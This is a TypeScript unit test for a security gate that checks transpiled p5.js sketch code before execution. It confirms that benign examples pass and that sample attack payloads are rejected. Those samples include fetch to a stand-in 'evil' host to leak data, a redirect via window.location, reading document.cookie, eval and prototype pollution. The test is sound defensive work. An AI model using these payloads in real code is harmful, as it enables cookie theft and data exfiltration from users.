/**
 * Unit test for assertSafeP5 — the allow-list gate that sits between the
 * transpiler and `new Function(...)` in the browser harness. Confirms that
 * (a) every transpile output from the few-shot bank passes the gate, and
 * (b) representative attack payloads injected after transpile are rejected.
 *
 * Run: `npx tsx examples/creative-coding-p5js/test-safety.ts`
 */

// @ts-expect-error — .mjs has no .d.ts; runtime import is fine under tsx.
import { assertSafeP5 } from "./harness.mjs";

import { FEW_SHOTS } from "./examples.js";
import { transpile } from "./transpile.js";

let pass = 0;
let fail = 0;

function ok(label: string): void {
  console.log(`ok: ${label}`);
  pass++;
}

function bad(label: string, why: string): void {
  console.error(`FAIL: ${label} — ${why}`);
  fail++;
}

function expectAccept(label: string, js: string): void {
  try {
    assertSafeP5(js);
    ok(label);
  } catch (e) {
    bad(label, `unexpectedly rejected: ${(e as Error).message}`);
  }
}

function expectReject(label: string, js: string, mustInclude?: string): void {
  try {
    assertSafeP5(js);
    bad(label, "should have been rejected but passed");
  } catch (e) {
    const msg = (e as Error).message;
    if (mustInclude && !msg.includes(mustInclude)) {
      bad(label, `rejected but message didn't include "${mustInclude}": ${msg}`);
      return;
    }
    ok(`${label} → rejected (${msg})`);
  }
}

// (a) Every few-shot's transpile output must pass.
for (const ex of FEW_SHOTS) {
  const js = transpile(ex.output);
  expectAccept(`few-shot transpile passes: ${ex.input}`, js);
}

// (b) Attack payloads that could land in the transpile output if the
//     transpiler or validator ever regresses must be rejected.
expectReject(
  "eval()",
  "function draw() { eval('alert(1)'); }",
  "eval",
);

expectReject(
  "Function constructor",
  "function draw() { new Function('return process')(); }",
  "Function",
);

expectReject(
  "window access",
  "function draw() { window.location = 'http://evil'; }",
  "window",
);

expectReject(
  "document.cookie",
  "function draw() { var x = document.cookie; }",
  "document",
);

expectReject(
  "fetch()",
  "function draw() { fetch('http://evil/leak'); }",
  "fetch",
);

expectReject(
  "__proto__ pollution",
  "function draw() { ({}).__proto__.x = 1; }",
  "__proto__",
);

expectReject(
  "constructor escape",
  "function draw() { ({}).constructor; }",
  "constructor",
);

expectReject(
  "setTimeout()",
  "function draw() { setTimeout(() => {}, 100); }",
  "setTimeout",
);

expectReject(
  "disallowed p5 call (alert)",
  "function draw() { alert('hi'); }",
  "alert",
);

expectReject(
  "disallowed p5 call (text)",
  "function draw() { text('xss', 10, 10); }",
  "text",
);

// Sanity: a benign for-loop with allow-listed calls only must pass.
expectAccept(
  "for-loop with circle()",
  "function setup() { createCanvas(400, 400); noLoop(); }\nfunction draw() { for (let __i = 0; __i < 10; __i++) { circle(__i * 10, 100, 5); } }",
);

console.log(`\n${pass} passed, ${fail} failed`);
if (fail > 0) process.exit(1);
